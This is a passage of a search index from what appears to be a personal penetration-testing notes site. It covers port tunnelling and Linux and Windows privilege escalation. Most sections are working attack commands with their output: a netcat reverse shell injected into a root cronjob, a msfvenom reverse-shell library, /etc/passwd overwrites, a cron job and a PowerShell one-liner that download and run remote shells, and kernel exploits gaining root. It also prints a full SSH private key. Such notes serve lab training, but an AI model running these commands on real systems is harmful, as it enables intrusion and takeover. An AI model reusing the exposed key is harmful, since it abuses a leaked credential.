myip\n</code></pre>"},{"location":"network-pentest/port-redirection-tunneling/#netsh","title":"NetSH","text":"<pre><code>netsh interface portproxy add v4tov4 listenport=9001 listenaddress=0.0.0.0 connectport=12345 connectaddress=192.168.11.1\n</code></pre> <pre><code>netstat -anp TCP | find \"9001\"\n</code></pre> <p>Adding a firewall rule to allow inbound connections on port 9001</p> <pre><code>netsh advfirewall firewall add rule name=\"forward_port_rule\" protocol=TCP dir=in localip=192.168.11.135 localport=9001 action=allow\n</code></pre>"},{"location":"network-pentest/port-redirection-tunneling/#httptunnel-ing","title":"HTTPTunnel-ing","text":"<p>Redirect traffic of RDP at 192.168.11.135 to local at port 8888</p> <pre><code>ssh -L 0.0.0.0:8888:192.168.11.135:3389 hades@127.0.0.1\n</code></pre> <pre><code>ss -antp | grep \"8888\"\n</code></pre> <p>Redirect all traffic to http protocol.</p> <pre><code>hts --forward-port localhost:8888 1234\n</code></pre> <pre><code>hts --forward-port 192.168.35.129:3389 1234\n</code></pre> <pre><code>ps aux | grep hts\n</code></pre> <p>At Kali machine, redirect RDP protocol to http protocol</p> <pre><code>htc --forward-port 8080 192.168.11.133:1234\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/","title":"Linux Privilege Escalation","text":""},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#upgrade-shell","title":"Upgrade Shell","text":"<p>PayloadsAllTheThings: Spawn TTY Shell</p>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#spawning-a-tty-shell","title":"Spawning a TTY Shell","text":"pythonscriptperlrubyos.systemsh -iluaIn an editor <pre><code>python3 -c 'import pty; pty.spawn(\"/bin/sh\")'\n</code></pre> <pre><code>python3 -c 'import pty; pty.spawn(\"/usr/bin/sh\")'\n</code></pre> <pre><code>python3 -c 'import pty; pty.spawn(\"/bin/zsh\")'\n</code></pre> <pre><code>python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre> <pre><code>python -c 'import pty; pty.spawn(\"/bin/sh\")'\n</code></pre> <pre><code>/usr/bin/script -qc /bin/sh /dev/null\n</code></pre> <pre><code>perl -e 'exec \"/bin/sh\";'\n</code></pre> <pre><code>perl: exec \"/bin/sh\";\n</code></pre> <pre><code>ruby: exec \"/bin/sh\"\n</code></pre> <pre><code>echo os.system('/bin/bash')\n</code></pre> <pre><code>/bin/sh -i\n</code></pre> <pre><code>lua: os.execute('/bin/sh')\n</code></pre> <p>(From within IRB)</p> <pre><code>exec \"/bin/sh\"\n</code></pre> <p>(From within vi)</p> <pre><code>:!bash\n</code></pre> <p>(From within vi)</p> <pre><code>:set shell=/bin/bash:shell\n</code></pre> <p>(From within nmap)</p> <pre><code>!sh\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#nice-terminal","title":"Nice Terminal","text":"<pre><code>export TERM=xterm\n</code></pre> <p>^Z</p> <pre><code>stty raw -echo; fg\n</code></pre> <pre><code>stty rows 42 columns 172\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#user-enumeration","title":"User Enumeration","text":"<p>Current User</p> <pre><code>hostname &amp;&amp; whoami &amp;&amp; id\n</code></pre> <p>Which ones have a valid shell</p> <pre><code>grep -vE \"nologin|false\" /etc/passwd\n</code></pre> <p>Folder</p> <pre><code>pwd; ls -la\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#os-architecture-kernel","title":"OS &amp; Architecture &amp; Kernel","text":"<p>Kernel version and Architecture</p> <pre><code>uname -a\n</code></pre> <pre><code>cat /etc/issue; uname -r; arch\n</code></pre> <p>What's the OS?</p> <pre><code>cat /etc/*-release\n</code></pre> <pre><code>lsb_release -a (Debian based OSs)\n</code></pre> <p>Drivers &amp; Kernel Modules</p> <pre><code>lsmod\n</code></pre> <pre><code>/sbin/modinfo &lt;name&gt;\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#compile-exploit-in-cc","title":"Compile exploit in C/C++","text":"Compile fileFile Size.c <pre><code>$ gcc -m32 Size.c -o x86-S\n</code></pre> <pre><code>$ ./x86-S\nSize = 4 \n</code></pre> <pre><code>$ gcc Size.c -o x64-S\n</code></pre> <pre><code>$ ./x64-S\nSize = 8\n</code></pre> <pre><code>#include&lt;stdio.h&gt;\nint main()\n{\n        printf(\"Size = %lu\", sizeof(size_t));\n}\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#2636-rc8-rds-protocol","title":"&lt;= 2.6.36-rc8 - 'RDS Protocol'","text":"<pre><code>www-data@ip:/tmp$ uname -a\nLinux ip 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux\n</code></pre> <p>https://fareedfauzi.gitbook.io/oscp-notes/linux-post-exploitation/linux-exploitation#exploits-worth-running</p> <p>https://www.exploit-db.com/raw/15285</p> <pre><code>gcc -m32 15285.c -o 15285\n</code></pre> <pre><code>www-data@ip:/tmp$ ./15285\n[*] Linux kernel &gt;= 2.6.30 RDS socket exploit\n[*] by Dan Rosenberg\n[*] Resolving kernel addresses...\n [+] Resolved security_ops to 0xc08c8c2c\n [+] Resolved default_security_ops to 0xc0773300\n [+] Resolved cap_ptrace_traceme to 0xc02f3dc0\n [+] Resolved commit_creds to 0xc016dcc0\n [+] Resolved prepare_kernel_cred to 0xc016e000\n[*] Overwriting security ops...\n[*] Overwriting function pointer...\n[*] Triggering payload...\n[*] Restoring function pointer...\n[*] Got root!\n# id\nuid=0(root) gid=0(root)\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#2637-full-nelson","title":"&lt;= 2.6.37 'Full-Nelson.","text":"<pre><code>www-data@popcorn:/home/george$ uname -a\nLinux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux\nwww-data@popcorn:/home/george$ cat /etc/issue\ncat /etc/issue\nUbuntu 9.10 \\n \\l\n</code></pre> <p>https://www.exploit-db.com/exploits/15704</p> <pre><code>www-data@popcorn:/var/www$ gcc 15704.c -o 15704\ngcc 15704.c -o 15704\nwww-data@popcorn:/var/www$ chmod +x 15704\nchmod +x 15704\nwww-data@popcorn:/var/www$ ./15704\n./15704\n[*] Resolving kernel addresses...\n [+] Resolved econet_ioctl to 0xf846a280\n [+] Resolved econet_ops to 0xf846a360\n [+] Resolved commit_creds to 0xc01645d0\n [+] Resolved prepare_kernel_cred to 0xc01647d0\n[*] Calculating target...\n[*] Failed to set Econet address.\n[*] Triggering payload...\n[*] Got root!\n# whoami\nwhoami\nroot\n# \n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#2639-322-x86x64","title":"2.6.39 &lt; 3.2.2 (x86/x64)","text":"<pre><code>www-data@hades:/tmp$ uname -a\nLinux hades 3.0.0-12-server #20-Ubuntu SMP Fri Oct 7 16:36:30 UTC 2011 x86_64 x86_64 x86_64 GNU/Linux\n</code></pre> <p>https://www.exploit-db.com/exploits/35161</p> <pre><code>www-data@hades:/tmp$ ./35161 \n===============================\n=          Mempodipper        =\n=           by zx2c4          =\n=         Jan 21, 2012        =\n===============================\n\n[+] Ptracing su to find next instruction without reading binary.\n[+] Creating ptrace pipe.\n[+] Forking ptrace child.\n[+] Waiting for ptraced child to give output on syscalls.\n[+] Ptrace_traceme'ing process.\n[+] Error message written. Single stepping to find address.\n[+] Resolved call address to 0x401ce8.\n[+] Opening socketpair.\n[+] Waiting for transferred fd in parent.\n[+] Executing child from child fork.\n[+] Opening parent mem /proc/2338/mem in child.\n[+] Sending fd 6 to parent.\n[+] Received fd at 6.\n[+] Assigning fd 6 to stderr.\n[+] Calculating su padding.\n[+] Seeking to offset 0x401cdc.\n[+] Executing su with shellcode.\n# id\nuid=0(root) gid=0(root) groups=0(root),33(www-data)\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#processes-and-services","title":"Processes and Services","text":"<pre><code>ps axu\n</code></pre> <p>How to check if port is in use in</p> <pre><code>sudo lsof -i -P -n | grep LISTEN\n</code></pre> <p>List all enabled services from systemctl</p> <pre><code>systemctl list-unit-files | grep enabled\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#active-network-connection","title":"Active network connection","text":"<pre><code>ss -anp\n</code></pre> <pre><code>netstat -antup\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#binaries-that-autoelevate","title":"Binaries That AutoElevate","text":"<pre><code>find / -perm -u=s -type f -exec ls -l {} \\; 2&gt;/dev/null\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#sudo-in-linux","title":"sudo in linux","text":""},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#check-sudo-access","title":"Check sudo access","text":"<pre><code>$ sudo -l\n[sudo] password for Hades: \nMatching Defaults entries for pentesterlab on 7358cafc3ebe:\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\nUser Hades may run the following commands:\n    (victim) /bin/bash\n</code></pre> <p>Mix cp/chown and chmod</p> <p>https://www.adampalmer.me/iodigitalsec/2009/10/03/linux-c-setuid-setgid-tutorial</p> <p>https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries</p> <pre><code>sudo -l\nMatching Defaults entries for Hades:\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\nUser Hades may run the following commands:\n    (victim) /bin/chmod, /bin/cp\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#readablewritable","title":"Readable/Writable","text":"<pre><code>find / -writable -type d 2&gt;/dev/null\n</code></pre> <pre><code>find / -writable 2&gt;/dev/null\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#file-etcpasswd","title":"File /etc/passwd","text":"<p>File /etc/passwd can be modify by user permission.</p> <pre><code>ls -l /etc/passwd\n</code></pre> <pre><code>$ openssl passwd \nPassword: \nVerifying - Password: \nQzKsrWCYxmRPY\n</code></pre> <p><code>QzKsrWCYxmRPY</code> : non password hash.</p> <pre><code>sed 's/root:x:/root:QzKsrWCYxmRPY:/' /etc/passwd &gt; passwd\n</code></pre> <pre><code>cat passwd &gt; /etc/passwd\n</code></pre> <pre><code>su\n</code></pre> <p>Generate password for new user</p> <pre><code>openssl passwd -1 -salt hades leecybersec\n</code></pre> <p>Credential: <code>toor</code> / <code>leecybersec</code></p> <pre><code>echo 'toor:$1$hades$KKCtexC.plAyjcJkX7War0:0:0:root:/root:/bin/sh' &gt;&gt; /etc/passwd\n</code></pre> <p>https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation</p>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#scheduled-tasks","title":"Scheduled Tasks","text":"<pre><code>find / -name *crontab* 2&gt;/dev/null\n</code></pre> <pre><code>ls -lah /etc/cron*\n</code></pre> <pre><code>cat /etc/crontab\n</code></pre> <pre><code>grep \"CRON\" /var/log/* 2&gt;/dev/null\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#cronjob-file-insecure","title":"Cronjob file insecure","text":"<p>Cronjob file check.sh overwrite, file check.sh running as root every 1 minute.</p> <pre><code>ls -l check.sh\n-rw-rw-rw- 1 root root &lt;snip&gt; check.sh\n</code></pre> <p>Can change file check.sh with user permission.</p> <pre><code>echo \"rm /tmp/f; mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f\" &gt;&gt; check.sh\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#path-search-order-crontab","title":"PATH Search Order Crontab","text":"<pre><code>$ cat /etc/crontab\n&lt;snip&gt;\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user  command\n*/5 *   * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )\n47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )\n52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )\n#\n</code></pre> <p>==&gt; <code>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</code></p> <pre><code>chloe@roquefort:~$ ls -ld /usr/local/bin\ndrwxrwsrwx 2 root staff 4096 Apr 24  2020 /usr/local/bin\n</code></pre> <pre><code>cp /tmp/shell /usr/local/bin/run-parts\n</code></pre> <p>https://crontab.guru: <code>*/5 : \"At every 5th minute.\"</code></p> <pre><code>$ sudo nc -nvlp 22\nlistening on [any] 22 ...\nconnect to [ip] from (UNKNOWN) [ip] 37228\nid\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#module-import-hijacking","title":"Module Import Hijacking","text":""},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#dynamic-library-hijacking","title":"Dynamic Library Hijacking","text":"<pre><code>SHELL=/bin/bash\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\nLD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils\nMAILTO=\"\"\n&lt;snip&gt;\n  *  *  *  *  * root       /usr/bin/log-sweeper\n</code></pre> <p>==&gt; <code>LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils</code></p> <pre><code>[hades@hades ~]$ ls -ld /usr/local/lib/dev\ndrwxrwxrwx 2 root root 6 Sep  7  2020 /usr/local/lib/dev\n</code></pre> <pre><code>[hades@hades ~]$ ls -l /usr/bin/log-sweeper\n-rwxr-xr-x. 1 root root 8800 Sep  4  2020 /usr/bin/log-sweeper\n[hades@hades ~]$ /usr/bin/log-sweeper\n/usr/bin/log-sweeper: error while loading shared libraries: utils.so: cannot open shared object file: No such file or directory\n</code></pre> <p>exploit</p> <pre><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.158 LPORT=6379 -f elf-so &gt; utils.so\n</code></pre> <pre><code>[hades@hades dev]$ chmod 777 utils.so \n[hades@hades dev]$ pwd\n/usr/local/lib/dev\n</code></pre> <pre><code>$ sudo nc -nvlp 6379\nlistening on [any] 6379 ...\nconnect to [ip] from (UNKNOWN) [ip] 55124\nid\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#python-module-hijacking","title":"Python Module Hijacking","text":"<pre><code>$ cat python.py \n#!/usr/bin/python\n\nimport sys\n\ntry:\n    import controller\nexcept Exception:\n    print \"[!] ERROR: Unable to load controller module.\"\n    sys.exit()\n</code></pre> <p><code>controller module</code> not found.</p> <p>Create file <code>controller.py</code> and add malicious python code.</p> <pre><code>echo 'import os;os.system(\"chmod 777 /etc/passwd\")' &gt; controller.py\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#docker-container","title":"Docker container","text":""},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#check-being-a-container","title":"Check being a container","text":"<pre><code>root@315d7648a173:/# ls -lah\n&lt;snip&gt;\n-rwxr-xr-x   1 root root    0 Jun  9 13:01 .dockerenv\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#mount-disk-to-docker-machine","title":"Mount disk to docker machine.","text":"<pre><code>mkdir -p /mnt/hola\n</code></pre> <pre><code>mount /dev/sda1 /mnt/hola\nmount /dev/sda2 /mnt/hola\nmount /dev/sda3 /mnt/hola\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#after-mounted","title":"After mounted","text":"<p>Add cron job: https://github.com/MauroEldritch/GEVAUDAN/blob/master/gevaudan.rb</p> <pre><code>/sbin/mount.glusterfs ip:/gluster_shared_storage /tmp/x\n</code></pre> <pre><code>echo '* * * * * root /bin/bash -c \"/usr/bin/wget http://ip/shell -O /tmp/shell &amp;&amp; chmod 777 /tmp/shell &amp;&amp; /tmp/shell\"' &gt; /tmp/x/snaps/gcron_enabled\n</code></pre> <p>Change root directory</p> <pre><code>mkdir /hdd &amp;&amp; mount /dev/sda1 /hdd &amp;&amp; chroot /hdd\n</code></pre> <p>Add ssh public key</p> Gen keyid_rsa.pubid_rsa <pre><code>ssh-keygen -t rsa\n</code></pre> <pre><code>echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAA ...key...' &gt; /mnt/hola/root/.ssh/authorized_keys\n</code></pre> <pre><code>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+SK1375peajAYzOZIWV/zjsUPDs9+hxk5Ggo+cKAQKg3uImvEmQtuJKrygU03RE8EVtPw5HuViM70NLVLK2H4iSkUSSp33nWkIq1kz0yJksiKjlx2h0eXzBwQ7zeymFNr4oRvpigwEXnScOY39040h3xTqa7RikYVP4h25TtfhNExVtaZRzO6dDJSTTZurg81lkwvILHY9vw77TBP1Vsa4htYcufPKoxUDId3JllPO7Q6UTjGvlLjVf0az9Q0Kpe/D3PsAM/Wn+gCbsBkzgJ1Jhx+BFbakXto3mgdGsh3fbOLsFTX8+XTLaZNFa/faIOwUcVPvteJ2gRGe2QT6A5WV53ql3uoBnNEBwkndrWtDXyKDhPdYQXrDGZc3x2GMuM2LGkZKpM3CKv7JvUhvMj/J76380khYhFj1COOfUeQPjUmuB4Kyo5ZTDfkNXrP2CirrnGiKMOv/3hHbTSlP9t0eVQdeMQfL98NwZyRwMh9c3vQEh29PJc+BflSRJRyZhE= leecybersec@kali\n</code></pre> <pre><code>-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#installed-and-patch-levels","title":"Installed and Patch Levels","text":"<pre><code>dpkg -l (Debian based OSs)\n</code></pre> <pre><code>rpm -qa (CentOS / openSUSE )\n</code></pre> <pre><code>uname -a\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#networking-enumeration","title":"Networking Enumeration","text":""},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#interface-and-routable","title":"Interface and Routable","text":"<pre><code>ip a\n</code></pre> <pre><code>/sbin/route\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#firewall-and-rules","title":"Firewall and Rules","text":"<pre><code>grep -Hs iptables /etc/*\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#unmounted-disks","title":"Unmounted Disks","text":"<p>List all mounted files system</p> <pre><code>mount\n</code></pre> <pre><code>cat /etc/fstab\n</code></pre> <p>List all disk</p> <pre><code>/bin/lsblk\n</code></pre> <p>Mount disk</p> <pre><code>sudo mount -o nolock 192.168.11.131:/share ~/share\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#enumeration-tools","title":"Enumeration Tools","text":"<p>Basic Linux Privilege Escalation</p> <p>https://gtfobins.github.io</p> <p>https://github.com/DominicBreuker/pspy</p> <p>https://github.com/rebootuser/LinEnum</p> <p>https://github.com/diego-treitos/linux-smart-enumeration</p> <p>http://pentestmonkey.net/tools/audit/unix-privesc-check</p>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#more-commands","title":"More Commands","text":""},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#history-bashrc-backup","title":"history, bashrc, backup","text":"<pre><code>find / -name *history* 2&gt;/dev/null\nfind / -name *backup* 2&gt;/dev/null\nfind / -name *bashrc* -exec grep passwod {} \\; 2&gt;/dev/null\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#port-tunneling","title":"Port Tunneling","text":"<p>Local Tunneling</p> <pre><code>ssh -L $myport:127.0.0.1:5985 hades@192.168.11.133 -i id_rsa\n</code></pre> <p>Remote Tunneling</p> <pre><code>ssh -R $myip:$myport:127.0.0.1:5985 kali@$myip -i kali-idrsa\n</code></pre> <p>SSH ESCAPE CHARACTERS</p> <p><code>~C</code> to type ssh command</p>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#generate-ssh-key","title":"Generate SSH Key","text":"<pre><code>ssh-keygen -t rsa\n</code></pre> <pre><code>cp id_rsa.pub authorized_keys\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Unix%26Linux/#add-user-to-sudo","title":"Add user to sudo","text":"<p>Create <code>user:pass</code></p> <pre><code>echo -e \"pass\\pass\" | adduser --gecos \"\" user\n</code></pre> <pre><code>usermod -aG sudo user\n</code></pre> <pre><code>sudo su - user\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Windows/","title":"Windows Privilege Escalation","text":""},{"location":"network-pentest/privilege-escalation/Windows/#upgrade-shell","title":"Upgrade Shell","text":"<p>Fully interactive reverse shell on Windows</p> <p>Server Side</p> <pre><code>stty raw -echo; (stty size; cat) | sudo nc -lvnp myport\n</code></pre> <p>Client Side</p> <pre><code>powershell IEX(IWR http://myip/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell myip myport\n</code></pre> <p>File Invoke-ConPtyShell.ps1</p>"},{"location":"network-pentest/privilege-escalation/Windows/#user-enumeration","title":"User Enumeration","text":"<p>Current User</p> <pre><code>whoami\n</code></pre> <pre><code>net user &lt;username&gt;\n</code></pre> <pre><code>whoami /groups\n</code></pre> <p>Other Users</p> <pre><code>net user\n</code></pre> <pre><code>net localgroup administrators\n</code></pre> <p>Hostname</p> <pre><code>hostname\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Windows/#installed-and-patch-levels","title":"Installed and Patch Levels","text":"<pre><code>wmic product get name, version, vendor\n</code></pre> <pre><code>dir \"C:\\Program Files\"\n</code></pre> <pre><code>dir \"C:\\Program Files (x86)\"\n</code></pre> <p>Patch Levels</p> <pre><code>wmic qfe get Caption, Description, HotFixID, InstalledOn\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Windows/#device-drivers-kernel-modules","title":"Device Drivers &amp; Kernel Modules","text":"<p>Using powershell &gt;&gt;&gt;</p> <pre><code>driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path\n</code></pre> <pre><code>Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like \"*VMware*\"}\n</code></pre> <p>https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated</p>"},{"location":"network-pentest/privilege-escalation/Windows/#os-architecture-driver","title":"OS &amp; Architecture &amp; Driver","text":"<p>OS &amp; Architecture</p> <pre><code>systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"\n</code></pre> <p>Driver Enumeration</p> <pre><code>driverquery /v\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Windows/#639600-kernel-mode-drivers","title":"6.3.9600 Kernel-Mode Drivers","text":"<pre><code>C:\\Users\\kostas\\Desktop&gt;systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"\nOS Name:                   Microsoft Windows Server 2012 R2 Standard\nOS Version:                6.3.9600 N/A Build 9600\nSystem Type:               x64-based\n</code></pre> <p>https://github.com/leecybersec/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip</p> <pre><code>C:\\inetpub\\drupal-7.54&gt;ms15-051x64.exe \"powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')\"\nms15-051x64.exe \"powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')\"\n[#] ms15-051 fixed by zcgonvh\n[!] process with pid: 1076 created.\n==============================\n</code></pre> <pre><code>$ sudo nc -nvlp 443\nlistening on [any] 443 ...\nconnect to [10.10.14.5] from (UNKNOWN) [10.10.10.9] 53968\nMicrosoft Windows [Version 6.1.7600]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\inetpub\\drupal-7.54&gt;whoami\nwhoami\nnt authority\\system\n</code></pre> <p>CVE-2015-1701</p>"},{"location":"network-pentest/privilege-escalation/Windows/#639600-rgnobj-integer-o-flow","title":"6.3.9600 rgnobj Integer O-flow","text":"<pre><code>C:\\Users\\kostas\\Desktop&gt;systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"\nOS Name:                   Microsoft Windows Server 2012 R2 Standard\nOS Version:                6.3.9600 N/A Build 9600\nSystem Type:               x64-based\n</code></pre> <pre><code>wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe\n</code></pre> <pre><code>C:\\Users\\kostas\\Desktop&gt;41020.exe\n41020.exe\nMicrosoft Windows [Version 6.3.9600]\n(c) 2013 